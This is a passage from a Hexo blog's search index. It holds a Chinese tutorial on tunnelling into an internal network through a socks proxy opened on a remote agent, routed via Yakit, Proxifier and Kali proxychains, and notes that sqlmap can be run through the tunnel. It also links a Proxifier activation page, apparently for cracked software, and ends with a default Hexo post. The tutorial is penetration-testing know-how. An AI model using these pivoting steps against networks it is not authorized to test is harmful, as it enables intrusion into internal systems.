class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000349590-1745557655943-1.png" alt="image-20250403000349590"></p><p>接下来开一个<code>socks</code>进行流量转发</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks</span> <span class="hljs-number">15000</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000622117-1745557659184-3.png" alt="image-20250403000622117"></p><p>像上面图这样就是开成功了，然后是想要在自己本机上执行命令打到内网有三种方式</p><h2 id="第一种是使用Yakit"><a href="#第一种是使用Yakit" class="headerlink" title="第一种是使用Yakit"></a>第一种是使用<code>Yakit</code></h2><p>Yakit 下载网址：<a href="https://yaklang.com/">https://yaklang.com/</a></p><p>先来配置一下 Yakit</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001646226-1745557663297-5.png" alt="image-20250403001646226"></p><p>点击选择这个项目</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001726874-1745557667098-7.png" alt="image-20250403001726874"></p><p>然后点击左上角的 MITM</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002025559-1745557671758-9.png" alt="image-20250403002025559"></p><p>然后配置，下游代理如下填写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socks5://<span class="hljs-tag">&lt;<span class="hljs-name">admin的IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">admin的端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我这里的就是</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">socks5:</span><span class="hljs-comment">//47.122.75.126:15000</span><br></code></pre></td></tr></table></figure><p>然后点击劫持启动</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002413167-1745557677013-11.png" alt="image-20250403002413167"></p><p>然后在弹出的浏览器输入连接的主机的ip和端口</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002615527-1745557680916-13.png" alt="image-20250403002615527"></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002710313-1745557684309-15.png" alt="image-20250403002710313"></p><p>可能会出现上面这样，把<code>https</code>改成<code>http</code>就行</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002746222-1745557687495-17.png" alt="image-20250403002746222"></p><p>接下来就只要知道文件路径就可以访问了</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002856812-1745557691220-19.png" alt="image-20250403002856812"></p><p>不过我这里是在我自己的主机里搞的，似乎本来就可以连接上</p><h2 id="第二种是用Proxifier"><a href="#第二种是用Proxifier" class="headerlink" title="第二种是用Proxifier"></a>第二种是用<code>Proxifier</code></h2><p>Proxifier下载激活博客：<a href="https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html">https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html</a></p><p>进行配置，找到导航栏 Profile-&gt;Proxy Servers</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010419632-1745557696161-21.png" alt="image-20250403010419632"></p><p>添加一个代理</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010858948-1745557700258-23.png" alt="image-20250403010858948"></p><p>然后还要配置一个，就是第二个 Proxification Rules</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403011335167-1745557703543-25.png" alt="image-20250403011335167"></p><p>现在就相当于在我主机的内网上了（虽然我现在本身就是用的自己的主机，不过过程就是这个过程）</p><h2 id="第三种是使用在kali里的proxychains"><a href="#第三种是使用在kali里的proxychains" class="headerlink" title="第三种是使用在kali里的proxychains"></a>第三种是使用在<code>kali</code>里的<code>proxychains</code></h2><p>在kali中是自带<code>proxychains</code>的</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003441163-1745557706372-27.png" alt="image-20250403003441163"></p><p>使用这个前要进行配置文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>直接拉到最后一行，如下图</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003827997-1745557709281-29.png" alt="image-20250403003827997"></p><p>然后把<code>socks4</code>那行注释掉，在最后加入<code>socks5 &lt;admin的IP&gt; &lt;admin的端口&gt;</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004047794-1745557712320-31.png" alt="image-20250403004047794"></p><p>保存退出，这就和前面的一样做流量转发</p><p>然后就可以执行命令，在前面加入<code>proxychains</code>就行</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004412418-1745557715271-33.png" alt="image-20250403004412418"></p><p>甚至可以跑sqlmap</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004640275-1745557719747-35.png" alt="image-20250403004640275"></p><p>OK，完事，撒花~~~</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识 内网代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/25/hello-world/"/>
    <url>/2025/04/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>test</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
